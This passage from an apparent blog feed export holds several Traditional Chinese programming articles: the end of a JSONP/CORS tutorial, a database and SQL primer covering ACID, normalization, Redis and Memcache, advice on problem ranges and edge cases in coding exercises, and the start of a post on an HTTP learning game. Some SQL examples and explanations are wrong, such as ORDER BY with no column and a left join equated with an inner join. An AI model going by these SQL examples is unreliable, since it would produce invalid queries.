logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;_links&quot;:&#123;&#125;,&quot;localized_name&quot;:&quot;Dota 2&quot;,&quot;locale&quot;:&quot;zh-tw&quot;&#125;,&quot;viewers&quot;:65243,&quot;channels&quot;:373&#125;]&#125;)

URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1
receiveData(&#123;&quot;_total&quot;:1067,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1&quot;,&quot;next&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1\u0026offset=1&quot;&#125;,&quot;top&quot;:[&#123;&quot;game&quot;:&#123;&quot;name&quot;:&quot;Dota 2&quot;,&quot;popularity&quot;:63361,&quot;_id&quot;:29595,&quot;giantbomb_id&quot;:32887,&quot;box&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;logo&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;_links&quot;:&#123;&#125;,&quot;localized_name&quot;:&quot;Dota 2&quot;,&quot;locale&quot;:&quot;zh-tw&quot;&#125;,&quot;viewers&quot;:65622,&quot;channels&quot;:376&#125;]&#125;)

有發現了嗎？它就是透過你帶過去的callback這個參數當作函式名稱，把 JavaScript 物件整個傳到 Function 裡面，你就可以在 Function 裡面拿到資料。
結合起來會變這樣：
&lt;script src=&quot;https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1&quot;&gt;&lt;/script&gt;&lt;script&gt;  function receiveData (response) &#123;    console.log(response);  &#125;&lt;/script&gt;

利用 JSONP，也可以存取跨來源的資料。但 JSONP 的缺點就是你要帶的那些參數永遠都只能用附加在網址上的方式（GET）帶過去，沒辦法用 POST。
如果能用 CORS 的話，還是應該優先考慮 CORS。
總結今天這篇文章的內容就是從抓資料這件事情開始，一步步告訴你應該去哪裡抓？應該怎麼抓？用 API 抓，那什麼是 API？怎麼在 JavaScript 裡面呼叫 Web API？怎麼樣存取跨來源的資料？
一般來說，跟前端抓資料有關的東西我基本上都提到了，不過有個遺珠之憾是沒有提到Fetch API，這是比較新的標準，也是拿來抓資料用的，MDN 上面的介紹是：

The Fetch API provides an interface for fetching resources (including across the network). It will seem familiar to anyone who has used XMLHttpRequest, but the new API provides a more powerful and flexible feature set.

有興趣的讀者們可以自己去看一下。
希望大家看完這篇之後，會更了解怎麼樣串接後端 API，以及串接的時候可能會碰到哪些困難。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>xhr</tag>
        <tag>ajax</tag>
        <tag>cors</tag>
        <tag>jsonp</tag>
      </tags>
  </entry>
  <entry>
    <title>後端軟體工程工具箱：資料庫/SQL/ORM篇</title>
    <url>/2017/05/06/back-end-engineer-toolbox-database-sql-orm/</url>
    <content><![CDATA[前言事實上，要成為一個好的後端軟體工程師除了必須對於後端工程的程式語言的部份有所了解外，也需要了解系統設計的原理和伺服器規劃（Server 規劃、Load Balance、Memory Cache、DB Scaling、Cloud Server、後端框架、TCP&#x2F;IP&#x2F;UDP 網路通訊協定、HTTP 超文字傳輸協定、設計模式、資料庫操作、SQL&#x2F;ORM、資訊安全、性能優化等）。接下來我們將來探討資料庫&#x2F;SQL&#x2F;ORM 相關議題。
資料庫基礎概念一般持久性儲存資料是資訊系統或是應用程式蠻重要的一個環節，除了使用檔案系統外使用資料庫也是另外一個非常重要的儲存工具。比起檔案系統，資料庫雖然相對複雜（一般來說需要正規化）但在資料查詢使用和管理上比起檔案會方便許多。
在資料庫系統中，我們會稱資料庫操作的一個完整的邏輯過程為事務（transaction）。例如：銀行 ATM 轉帳，從原帳戶扣除金額，以及向目標帳戶新增金額，這兩個資料庫操作的總和，就會構成一個完整的邏輯過程，不可拆分。這個過程被稱為一個事務，具有 ACID 特性。

什麼是 ACID？ ACID 係指資料庫管理系統（DBMS）在寫入&#x2F;更新資料的過程中，為保證事務（transaction）是正確可靠的，所必須具備的四個特性：原子性（atomicity，或稱不可分割性）、一致性（consistency）、隔離性（isolation，又稱獨立性）、持久性（durability）

原子性：一個事務（transaction）中的所有操作，要麼全部完成，要麼全部不完成，不會結束在中間某個環節。事務在執行過程中發生錯誤，會被回滾（rollback）到事務開始前的狀態，就像這個事務從來沒有執行過一樣

一致性：在事務開始之前和事務結束以後，資料庫的完整性沒有被破壞。這表示寫入的資料必須完全符合所有的預設規則，這包含資料的精確度、串聯性以及後續資料庫可以自發性地完成預定的工作

隔離性：資料庫允許多個並發事務同時對齊數據進行讀寫和修改的能力，隔離性可以防止多個事務並發執行時由於交叉執行而導致數據的不一致。事務隔離分為不同級別，包括讀未提交（read uncommitted）、讀提交（read committed）、可重複讀（repeatable read）和序列化（serializable）

持久性：事務處理結束後，對資料數據的修改就是永久的，即便系統故障也不會遺失



資料庫並發控制（Concurrency control） 資料庫管理系統（DBMS）中的並發控制的任務是確保在多個事務同時存取資料庫中同一數據時不破壞事務的隔離性（isolation）以及資料庫的統一性。下面舉例說明並發操作帶來的數據不一致性問題：
 現有兩處火車票售票點，同時讀取某一趟列車車票資料庫中車票餘額為 X。兩處售票點同時賣出一張車票，同時修改餘額為 X -1 寫回資料庫，這樣就造成了實際賣出兩張火車票而資料庫中的記錄卻只少了一張。
 產生這種情況的原因是因為兩個事務讀入同一數據並同時修改，其中一個事務提交的結果破壞了另一個事務提交的結果，導致其數據的修改遺失，破壞了事務的隔離性。並發控制要解決的就是這類問題。
 一般來說我們會使用以下幾種方式來解決：

封鎖  封鎖（lock）是一項用於多用戶同時存取資料庫的技術，是實作並行控制的一項重要手段，能夠防止當多用戶覆寫資料庫時造成資料遺失和損壞。當有一個用戶對資料庫內的資料進行操作時，在讀取資料前先鎖住資料，這樣其他用戶就無法存取和修改該資料，直到這一資料修改並寫回資料庫解除封鎖為止。

時間戳  時間戳（Timestamp）用於辨識記錄下來的時間日期的字串。國際標準為 ISO 8601
  2005-10-30 T 10:45 UTC2007-11-09 T 11:20 UTC Sat Jul 23 02:16:57 2005

樂觀並發控制  樂觀並行控制（又稱「樂觀鎖」，Optimistic Concurrency Control，簡稱 OCC ）是一種並行控制的方法。它假設多用戶並行的交易在處理時不會彼此互相影響，各交易能夠在不產生鎖的情況下處理各自影響的那部分資料。在提交資料更新之前，每個交易會先檢查在該交易讀取資料後，有沒有其他交易又修改了該資料。如果其他交易有更新的話，正在提交的交易會進行回復
  讀取：交易將資料讀入快取，這時系統會給交易分派一個時間戳  校驗：交易執行完畢後，進行提交。這時同步校驗所有交易，如果交易所讀取的資料在讀取之後又被其他交易修改，則產生衝突，交易被中斷回復  寫入：通過校驗階段後，將更新的資料寫入資料庫

悲觀並發控制  悲觀並行控制（又稱「悲觀鎖」，Pessimistic Concurrency Control，簡稱 PCC ）是一種並行控制的方法。它可以阻止一個交易以影響其他用戶的方式來修改資料。如果一個交易執行的操作讀某行資料應用了鎖，那只有當這個交易把鎖釋放，其他交易才能夠執行與該鎖衝突的操作。悲觀並行控制主要用於資料爭用激烈的環境，以及發生並發衝突時使用鎖保護資料的成本要低於回復交易的成本的環境中。



什麼是正規化？ 正規化是在資料庫中組織資料一系列原理和技術。其中包括建立資料表，以及在這些資料表之間根據規則建立關聯性，這些規則的設計目的是：透過刪除重複性和不一致的相依性，保護資料並讓資料庫更有彈性。 

第一正規化 第一正規化是資料庫正規化中所使用的一種正規形式。第一正規化是為了要排除重複群 的出現，所採用的方法是要求資料庫的每個列的值域都是由原子值組成；每個欄位的值都只能是單一值。

第二正規化 符合第一正規化。所有非鍵的欄位都一定是候選鍵全體欄位的函式。

第三正規化 是資料庫正規化中所使用的一種正規形式，要求所有非鍵屬性都只和候選鍵有相關性，也就是說非鍵屬性之間應該是獨立無關的。


 現在資料庫設計最多滿足 3NF，普遍認為正規化過高，雖然具有對資料關係更好的約束性，但也導致資料關係表增加而令資料庫 IO 更易繁忙，原來交由資料庫處理的關係約束現更多在資料庫使用程式中完成。


RDB vs. NoSQL 
一般而言，資料庫主要有分為關聯式資料庫（RDB）和 NoSQL（Not Only SQL &#x2F; nonrelational）資料庫，關聯式資料庫是由一堆資料表組成，每個資料表會對照一個固定的資料表結構（schema）。一般會使用 SQL（Structured Query Language）這種宣告式語言來操作數據資料，例如：MySQL、PostgreSQL、Oracle、MSSQL、SQLite。相對於關聯式資料庫，NoSQL 並不是使用資料表來保存資料，例如：MongoDB 就是一種很流行的文件型態 NoSQL 資料庫，其元素並非一列列數據，而是使用類 JSON 文件（document）格式呈現，更容易延展擴充和更有效率。此外還有針對不同需求設計的資料庫，例如：欄資料庫、圖形（Graph）資料庫等。本篇文章會主要討論關聯式資料庫並補充一些 NoSQL 知識點。
SQL首先，我們先來介紹如何使用 SQL 來操作關聯式資料庫！（注意 SQL 語法可以大寫或小寫，但實務上通常寫大寫。）
RDB 資料庫相關命名方式（主要依團隊共識）：

資料庫：底線連接 
資料表：複數、底線連接 
資料欄位：單數、底線連接

NoSQL 資料庫相關命名方式（主要依團隊共識）：

資料庫：Pascal casing (a.k.a. upper camel case)
資料表：單數，Schema name for tables prefix (E.g.: SchemeName.TableName) 
資料欄位：單數，Schema name for tables prefix (E.g.: SchemeName.TableName)

按：Microsoft 的命名方式喜歡單字第一個字母大寫，如 OrderDetail。而 MySQL 比較常見全部小寫，單字中間加底線的命名方式，如 birth_date。這和資料庫的字元大小寫敏感度預設值有關，MS SQL Server 預設是大小寫不分，MySQL 則是大小寫視為不同欄位，所以統一小寫比較不容易出錯。
 

資料庫&#x2F;資料表創建（CREATE） 表格被分為欄位 (column) 及列位 (row)。每一列代表一筆資料，而每一欄代表一筆資料的一部份。當我們對表格下定義時，我們需要註明欄位的標題，以及那個欄位的資料種類。
 使用 CREATE DATABASE 指令可以建立資料庫，命名使用小寫英文以及下底線組：
 CREATE DATABASE database_name;

 實際使用，建立一個名為 dr_course 的資料庫：
 CREATE DATABASE dr_course;

 使用 CREATE TABLE 指令可以建立資料表，命名使用大寫英文以及：
 CREATE TABLE &quot;表格名&quot;(&quot;欄位 1&quot; &quot;欄位 1 資料種類&quot;,&quot;欄位 2&quot; &quot;欄位 2 資料種類&quot;,... );

 實際使用，建立一個名為 users 的資料表：
 CREATE TABLE users(id BIGINT(7) NOT NULL AUTO_INCREMENT,name CHAR(50),email CHAR(50),age INT(50),course_id INT(50),salary INT(50));

 實際使用，建立一個名為 courses 資料表：
 CREATE TABLE courses(id BIGINT(7) NOT NULL AUTO_INCREMENT,name CHAR(50),point INT(50));

新增（INSERT）
 使用 INSERT INTO 指令可以新增資料：
 INSERT INTO &quot;表格名&quot; (&quot;欄位1&quot;, &quot;欄位2&quot;, ...) VALUES (&quot;值1&quot;, &quot;值2&quot;, ...);

 實際使用：
 INSERT INTO users (&quot;name&quot;, &quot;email&quot;, &quot;age&quot;, &quot;salary&quot;) VALUES (&quot;Mark&quot;, &quot;mark@gmail.com&quot;, 20, 70000);

選擇（SELECT）
 使用 SELECT 指令可以選取資料：
 SELECT &quot;欄位&quot; FROM &quot;表格名&quot;;

 實際使用：
 SELECT name, email FROM users;

刪除（DELETE）
 使用 DELETE 指令可以新增資料：
 DELETE FROM &quot;表格名&quot; WHERE &quot;條件&quot;;

 實際使用：
 DELETE FROM users WHERE id=1;
修改（UPDATE）
 使用 UPDATE SET 指令可以新增資料：
 UPDATE &quot;表格名&quot; SET &quot;欄位1&quot;=[新值] WHERE &quot;條件&quot;;

 實際使用：
 UPDATE users SET name=Mark WHERE id=1;

分組根據（GROUP BY）
 使用 INSERT INTO 指令可以新增資料：
 SELECT &quot;欄位1&quot;, SUM(&quot;欄位2&quot;) FROM &quot;表格名&quot; GROUP BY &quot;欄位1&quot;;

 實際使用：
 SELECT name, SUM(salary) FROM users GROUP BY users;

排序根據（ORDER BY）
 通常我們會需要將資料做排序，此時可以使用 ORDER BY 指令可以進行資料排序（[] 代表可選，ASC 和 DESC 是 ascending 和 descending 的縮寫，default 使用 ASC）：
 SELECT &quot;欄位名&quot; FROM &quot;表格名&quot; [WHERE &quot;條件&quot;]ORDER BY &quot;欄位名&quot; [ASC, DESC];

 實際使用：
 SELECT * FROM users ORDER BY ASC;

聯結（JOIN）
 我們現在有兩個資料表單一個是 users 一個是 courses ，一個存放使用者的資料表，一個存放課程資料表。我們希望計算使用者修了多少學分的課，所以透過 course_id 來連結兩個表單：
 SELECT A1.name, SUM(A2.point)  FROM users A1, courses A2 WHERE A1.course_id = A2.id GROUP BY A1.course_id;

 之前我們看到的左連接 (left join)，又稱內部連接 (inner join)。在這個情況下，要兩個表格內都有同樣的值，那一筆資料才會被選出。那如果我們想要列出一個表格中每一筆的資料，無論它的值在另一個表格中有沒有出現，我們就需要用到 SQL OUTER JOIN (外部連接) 的指令：
 SELECT A1.name, SUM(A2.point) SALES FROM users A1, courses A2 WHERE A1.course_id = A2.id (+) // 在 Oracle 資料庫要使用 + GROUP BY A1.course_id;

不重複資料（DISTINCT）
 使用 DISTINCT 指令可以選擇不重複資料：
 SELECT DISTINCT &quot;欄位&quot; FROM &quot;表格名&quot;;

 實際使用：
 SELECT DISTINCT name FROM users;

子查詢在 SQL 中可以將查詢結果當做一個資料表，再次進行 SELECT 查詢：
SELECT MIN(id) AS min_user_id FROM (SELECT id FROM users WHERE age = 20); 

索引建議資料表中常用來查詢的欄位使用 index 索引可以在使用 JOIN 時提高檢索效率，資料表中可以有一個或多個索引，也可以把某個索引欄位設為 unique。
查詢最佳化一般而言，先篩選再 JOIN 效能會比較好。但一般資料庫引擎會幫你最佳化，所以只要下 SQL 就好：
SELECT name FROM users JOIN courses ON users.course_id = courses.id WHERE courses.point &gt; 2;

ORM物件關聯對映（英語：Object Relational Mapping，簡稱ORM，或O&#x2F;RM，或O&#x2F;R mapping），是一種程式設計技術，用於實現物件導向編程語言裡不同類型系統的資料之間的轉換。
MongoDBMongoDB 是一個開源且跨平台的 NoSQL 資料庫，主要使用類 JSON 格式的文件進行資料儲存和 schema 定義。
 
RedisRedis 是一個非常流行的開源、支援網路、基於記憶體、鍵值對儲存資料庫，使用 ANSI C 編寫而成。
#coding:utf-8import redis# lredis-server 保持開啟，若是有使用密碼，則要在 ConnectionPool 使用 password=密碼pool = redis.ConnectionPool(host=&#x27;127.0.0.1&#x27;, port=6379, db=0)r=redis.StrictRedis(connection_pool=pool)# 字符串 stringr.set(&#x27;test&#x27;,&#x27;aaa&#x27;)print r.get(&#x27;test&#x27;);# 列表 list# 注意 python、lrange range 範圍x=0for x in range(0,11):	r.lpush(&#x27;list&#x27;,x)	x=x+1print r.lrange(&#x27;list&#x27;,&#x27;0&#x27;,&#x27;10&#x27;)# hash/dict dict_hash=&#123;&#x27;name&#x27;:&#x27;tang&#x27;,&#x27;password&#x27;:&#x27;tang_passwd&#x27;&#125;r.hmset (&#x27;hash_test&#x27;,dict_hash)print r.hgetall(&#x27;hash_test&#x27;)# 集合 setr.sadd(&#x27;set_test&#x27;,&#x27;aaa&#x27;,&#x27;bbb&#x27;)r.sadd(&#x27;set_test&#x27;,&#x27;ccc&#x27;)r.sadd(&#x27;set_test&#x27;,&#x27;ddd&#x27;)print r.smembers(&#x27;set_test&#x27;)# 有序集r.zadd(&#x27;zset_test&#x27;,&#x27;aaa&#x27;,1,&#x27;bbb&#x27;,1)r.zadd(&#x27;zset_test&#x27;,&#x27;ccc&#x27;,1)r.zadd(&#x27;zset_test&#x27;,&#x27;ddd&#x27;,1)print r.zrange(&#x27;zset_test&#x27;,0,10)

MemcacheMemcache 是一套開源的分散式的快取系統，是由 LiveJournal 的 Brad Fitzpatrick 所開發。由於一般認為 Memcache 缺乏認證以及安全管制，因此應該將 Memcache 伺服器放置在防火牆後。
此外 memcached 的 API 使用三十二位元的循環冗餘校驗（CRC-32）計算鍵值後，將資料分散在不同的機器上。當表格滿了以後，接下來新增的資料會以 LRU 機制替換掉。由於 memcached 通常只是當作快取系統使用，所以使用 memcached 的應用程式在寫回較慢的系統時（像是後端的資料庫）通常需要額外的程式碼更新 memcached 內的資料。
function get_foo (int userid) &#123;   result = db_select(&quot;SELECT * FROM users WHERE userid = ?&quot;, userid);   return result;&#125;
下面的程式會先到 Memcache 檢查是否有 userrow:userid 的資料，如果有則直接傳回結果，如果不存在時再去資料庫查詢，並將結果放到 Memcache 內，記得要同步資料庫和 Memcache，避免 Cache coherency 問題：
function get_foo (int userid) &#123;    result = memcached_fetch(&quot;userrow:&quot; + userid);    if (!result) &#123;        result = db_select(&quot;SELECT * FROM users WHERE userid = ?&quot;, userid);        memcached_add(&quot;userrow:&quot; + userid,  result);    &#125;    return result;&#125;

AWS DynamoDBAmazon DynamoDB 是一種快速靈活的 NoSQL 雲端資料庫服務，適合所有需要一致性且延遲低於 10 毫秒規模應用程式。它是全受管的雲端資料庫，支援文件和鍵值存放模型。
總結以上介紹了後端軟體工程工具箱：資料庫&#x2F;SQL&#x2F;ORM 相關議題，在接下來的章節中我們將為大家打開後端工程的工具箱，介紹那些必須掌握的後端軟體工程知識。
延伸閱讀
並發控制（英語：Concurrency control）
SQL 語法教學
資料庫概念
MySQL与PostgreSQL：该选择哪个开源数据库？哪一个更好？
說明資料庫正規化基本概念
SQL Tutorial
MySQL 超新手入門（8）儲存引擎與資料型態
標題[SQL ] 欄位命名規則
資料庫物件命名原則
資料庫表單及欄位命名規則實例

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>Back End</tag>
        <tag>Back End Development</tag>
        <tag>Back End Engineer</tag>
        <tag>TCP</tag>
        <tag>HTTP</tag>
        <tag>UDP</tag>
      </tags>
  </entry>
  <entry>
    <title>程式解題新手入門注意事項</title>
    <url>/2019/11/02/before-start-leetcode/</url>
    <content><![CDATA[前言在這兩三年之間，「刷題」似乎成為了一種風潮。本科系要去面試大公司的時候要刷題，非本科系出去面試也要刷題，好像只要沒有刷題就會落後他人，就會被公司刷掉。
其實我一直不是很喜歡「刷題」這個詞，主要是因為「刷」這個字。不知道大家對這個字的解讀是什麼，但我會認為有種「為了寫題目而寫題目」的感覺，就好像題海戰術那樣。雖然說題海戰術用得好的話成效滿顯著的，但總感覺很多人刷到最後會變成「看過的題目就會，沒看過的就一定不會」，如果是這樣子的話，那我覺得不是一件好事。
之前我有寫了一篇文章：當我們在學程式時，要學的到底是什麼？，稍微談了一下這件事情。
總之呢，比起刷題這個詞，我更喜歡用「程式解題」四個字來表達我想表達的意思。


有很多人剛開始練習程式解題的時候，是從演算法與資料結構開始的。可能去找了一些書或是線上課程來看，接著從經典的開始，例如說泡沫排序、選擇排序、插入排序，再來是困難一些的合併排序以及快速排序等等。但我覺得對真正的初學者來說，學這些還太早了。
簡單來說就是：「如果你寫不出九九乘法表，你會寫 KMP（可代換成任何演算法）也沒什麼用。」如果有兩個人，A 會寫九九乘法表但寫不出 KMP，B 會寫 KMP 但寫不出九九乘法表，我一定把 B 淘汰掉。因為 B 很有可能是直接把 KMP 的寫法記起來，而不是真的理解，否則我不相信他寫不出來九九乘法表。
在這邊也誠摯呼籲各個公司在面試的時候可以考那種比較簡單的題目，有時候成效會出乎意料的好。例如說找中位數、判斷質數或是大數加法之類的，會發現有些人還真的寫不出來。
總之呢，我認為要透過程式解題來熟悉演算法是絕對沒問題的，也是很棒的一個方法，但基礎要打穩，沒有打穩的話就只是在背題目而已。
而且還有一點很重要，在真正開始解題以前，你要先理解題目並且確切掌握題目的範圍。這點很多人都會忽略，直接就動手開始解題了，這在寫白板題的時候也不是一件好事。
所以這篇我們不談解題本身，而是來談談在動手解題以前應該先做的事。底下我們先來看一個題目，來源是 NPSC 2007 年國中組初賽。
題目名稱：不公平的人，是誰？自從周杰倫出了新專輯「牛仔很忙」後，大郭和小郭就時常幻想自己是牛仔，終於有一天，大郭找來了兩把水槍要和小郭決鬥。 可是玩了幾場以後，小郭全身都溼透了，大郭卻是一身乾爽，隱忍許久的小郭終於發難了！
小郭：「我都噴不到你………」
大郭：「那大概是你技術差吧？」
小郭：「騙人～騙人～你一定有作弊吧？」
雖然小郭什麼都比大郭差（諸如智力、運動神經等…），但是如果在事前大郭準備給小郭的水槍比較差的話，那代表大郭是從一開始就有心把這場遊戲策畫成不公平的壞人。
剛好路過的你，被吵吵鬧鬧的兩人抓去當裁判。
輸入說明輸入會是兩個字串 M 與 N。其中M代表大郭的水槍射程，N代表小郭的水槍射程，注意為求精確，所有射程的長度單位均為奈米。因為大郭弄來的水槍是22世紀的產物，故水槍的射程非常非常遠，最長可以到達400位數的數字（射程必為一非負整數）。
輸出說明對每一組測試資料，你應該回傳一個字串，該列從小郭的角度出發（小郭雖然比較笨，但還是很奸詐的！），判斷這是不是一場公平的比賽（對於小郭來說，只要大郭的射程不比小郭大，就是一場公平的遊戲）。若是對小郭有利的遊戲，則回傳「Fair」，若不是，則回傳「Unfair」
範例輸入123 456
範例輸出Fair

以上就是一個完整的題目，會包含題目介紹、輸入說明、輸出說明以及範例。你可能會覺得就是一個數字比大小的問題而已，但其實沒有那麼簡單。
接著我們就來看看應該要注意哪些東西。
1. 題目的範圍為什麼這種程式解題的題目一定要給範圍？要回答這個問題很簡單，我們先來看看如果不給範圍會怎樣，例如說：

請寫出一個判斷質數的 function

你可能看到以後就批哩啪啦寫完然後就交卷了。可是因為這個題目非常不明確，所以你其實沒有辦法確認自己的答案是不是對的，例如說：

是回傳 true 或 false 嗎？還是回傳字串 YES 跟 NO？
如果輸入是字串怎麼辦？我需要做處理嗎？
如果是小數或負數呢？需要做特別處理嗎？
如果數字超過 integer 的範圍會發生什麼事？

若是沒有明確地定義輸入以及輸出，其實你根本寫不出「正確」的程式，因為也沒有「正確」這種事，所以定義輸入範圍的第一個目的就是幫你更明確地去釐清題目。
例如說一個比較好的題目會長這樣：

請寫出一個函式，給定一個正整數 n（1&lt;&#x3D;n&lt;&#x3D;100000），請回傳 n 是否為質數，是的話回傳 true，反之回傳 false

當題目說「給定一個正整數 n（1&lt;&#x3D;n&lt;&#x3D;100000）」的時候，代表你可以完全不管超出這範圍的情形。n 絕對不會是字串，也不會是陣列，也不會是 0，不會是小數或負數，所以不需要去理會這些 case。
順帶一提，這是很多人在面試白板題的時候會犯的錯誤，沒有把題目範圍問清楚就開始實作了。
白板題是可以跟面試官討論的，這時候你就應該把題目範圍問清楚，才開始動手解題，而且題目範圍其實也會影響到你的解法。
舉開頭的題目來說：

因為大郭弄來的水槍是22世紀的產物，故水槍的射程非常非常遠，最長可以到達400位數的數字（射程必為一非負整數）

以 JavaScript 為例，有些人會很天真的以為這一題是在考你兩個「數字」比大小。400 位數的數字，JavaScript 存得下嗎？存不下。
可以用Number.MAX_SAFE_INTEGER來取到 Number 型態能存的最大數字，連 20 位都不到，何況是 400 位。
如果題目跟你說數字是 10 位數以內，就可以直接把字串轉成數字比大小然後回傳結果。但今天數字是 400 位數，就沒辦法用 Number 這個型態。所以要嘛就是直接拿字串來比大小，要嘛就是用比較潮的 BigInt 來解。
若是題目沒有給範圍，就沒辦法決定要採取怎樣的做法。所以範圍的目的就是把題目定義地更明確，畫一條線在那邊，跟你說：「欸欸，題目範圍到這邊喔，超出界線的可以不用考慮」
2. 寫完之後的測試如果是一些 Online Judge（以下簡稱 OJ）系統，平時的解題可以一直試錯，隨意寫完之後就丟上去，有錯的話再來 debug 找錯誤，沒錯的話就解下一題。
但是比賽或是有些面試的話就不一樣了，你只有一次機會，或是答錯了會有 penalty 之類的，所以要在送出答案之前自己先檢查個幾遍，確認沒什麼問題才送出。
這時候測試就很重要，基本上有幾個方法可以測試你寫出來的程式是否正確，例如說第一個，也是最簡單的一個：先拿題目給的範例測資（測試資料的簡稱）測，如果範例過不了那一定是寫錯了。
第二，如果可以的話，寫一個程式來測。這有些題目做得到有些做不到，例如說判斷質數可能就做不到，除非你去找別人寫好的判斷質數的 code 來用。但如果是上面數字比大小的這一題，針對小範圍（數字位數低於 10 位數以下）的情形就可以寫程式來測：
// 絕對是對的的數字比較function compare(a, b) &#123; return b &gt;= a ? &#x27;Fair&#x27; : &#x27;Unfair&#x27; &#125;  // 跑一萬遍for(let i = 1; i &lt;=10000; i++) &#123;  // 隨機產生資料  const a = Math.floor(Math.random() * 1e9)  const b = Math.floor(Math.random() * 1e9)  // 判斷一般數字比大小以及字串比大小的結果  // 記得這邊要轉成字串來比對  if (compare(a, b)!== stringCompare(a + &#x27;&#x27;, b + &#x27;&#x27;)) &#123;    // 出錯，印出來哪筆資料錯誤    console.log(&#x27;error&#x27;, a, b)  &#125;&#125;

跑個十次你就測十萬筆資料了，就能保證一些正確性。除了這樣以外，還有一點很重要：自己生測資，而且要產生那種邊界條件的測資。
3. 邊界條件邊界條件通常也被稱為 boundary case、corner case、edge case 等等（最精確的定義好像不太相同，但概念上應該差不多），一言以蔽之，就是很容易讓你程式出問題的測資，要測你的程式在極端的情形之下會不會壞掉。
以上面比大小的題目為例，可能就是 0 0、0 10 這種比較少會考慮到的條件。或者是以大數加法（兩個字串當作數字相加，例如說&#39;123&#39;+&#39;123&#39; =&gt; &#39;456&#39;）為例，就會是：

0 + 0，兩個零相加
0 + 9999，加完沒有改變
1 + 9999，加完會進位

最後再舉一個判斷迴文的例子，可能就會是：

空字串
只有一個字的字串

這些 edge case 是很容易會欠缺考慮而出錯的地方，所以在產生測資的時候，最好是自己也要想一下有哪些 edge case 是沒有考慮到的。很多時候你沒有拿滿分，就是因為這些 edge case 沒有考慮到。
可是就算滿分，就代表真的對了嗎？
4. 假解的可能性一般來說我們稱那些通過 OJ 但其實不是正確的解答為「假解」，通常會發生都是因為 OJ 上的測資太弱，所以才讓假解蒙混過關。
像是上面比大小這題，雖然題目寫說 M 與 N 最多可以到 400 位數，但有可能測資偷懶，最大只到五位數而已。在這種情形底下，你寫一個把字串轉換為數字然後比大小的解法就可以過關，但我們不會說這是正解，因為多加一筆測資答案就錯了。
或者是有些題目沒有卡時間複雜度，原本預期要 O(n) 的解法，結果用 O(n^2) 也可以過。有些假解寫了你會自己知道是假解，但有些你不會發覺。這部分其實要靠 OJ 來把關，測資必須用心產生，才能避免這種假解的狀況。
結論上面的題目如果想練習的話，我之前有寫了一個非常非常陽春而且破爛的專門給 JavaScript 的 OJ 系統：Lidemy OJ，在開始解題之前請先到首頁閱讀注意事項（例如說請勿使用箭頭函式之類的。
寫這篇的原因是希望剛接觸程式解題的新手們可以理解在動手解題之前，其實有更多重要的事需要去關注。記得先把題目定義清楚，才去動手解題，這個在面試考白板題的時候也是必備技能之一。
如果寫題目的時候發現題目沒有定義清楚，那這個題目或許就不是這麼好，可以跟網站反映一下，讓他們補上題目範圍。
祝大家都能在程式解題的路上找到樂趣。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>幕後花絮：Lidemy HTTP Challenge 的設計以及彩蛋</title>
    <url>/2019/05/18/behind-the-scenes-http-challenge/</url>
    <content><![CDATA[前言前陣子我為了幫自己的學生們更熟悉 HTTP 以及 API 的串接，寫出了一個小遊戲：Lidemy HTTP Challenge，需要根據每一關的說明取得正確的 token，一共有十五關，前十關基本，後五關進階。
經過了一些朋友的測試之後，慢慢調整、改善，最後讓學生測試發現反應都不錯，於是就在前端社群正式對外公開這個遊戲，讓大家也能一起參與。
如果你還沒玩過，那強烈建議你不要看這篇文章，因為這篇文章會破壞你遊玩的興致（大概就跟電影爆雷一樣）。建議可以先去玩一下，等全破了再回來看這篇文章，會得到一些不同的收穫。
接下來我會講一下這個遊戲誕生的歷程以及每個關卡的設計。
前人種樹，後人乘涼這種以遊戲當做外殼，內容卻是滿滿技術的手法大家應該並不陌生，至少我很不陌生。
最一開始有想要做成遊戲的這個想法，其實是因為一個學生傳給我這個：devtest，這是法國某一間公司的面試考題，如果你看到畫面一片白，那絕對不是網頁壞掉，不用擔心。
破完了上面這個遊戲之後，我才想起自己對這種模式其實很不陌生。小時候玩過高手過招，也玩過類似 Hack This Site!
 的遊戲。
或是以前有一陣子解謎遊戲正夯（跟程式無關的那種），我也曾經自己做了一個，那時候是用 PIXNET 文章鎖密碼的方式來做關卡，現在想想真是個非常方便的方法。
總之呢，雖然小時候都玩過，但長大之後卻慢慢忘記還有這種模式。這種模式的好處就在於它是遊戲。遊戲做得好，每個人都會愛上它。而且會比一般的你問我答或是簡答題有趣多了，所以遊戲是個很好的切入點。
想起遊戲的好處以後，我就決定要自己來做一個了，而主題就是之前我的學生們最不熟悉的串接 Web API！
最初的構想最一開始的想法是：

我希望這是一個你用 curl 也可以玩的遊戲

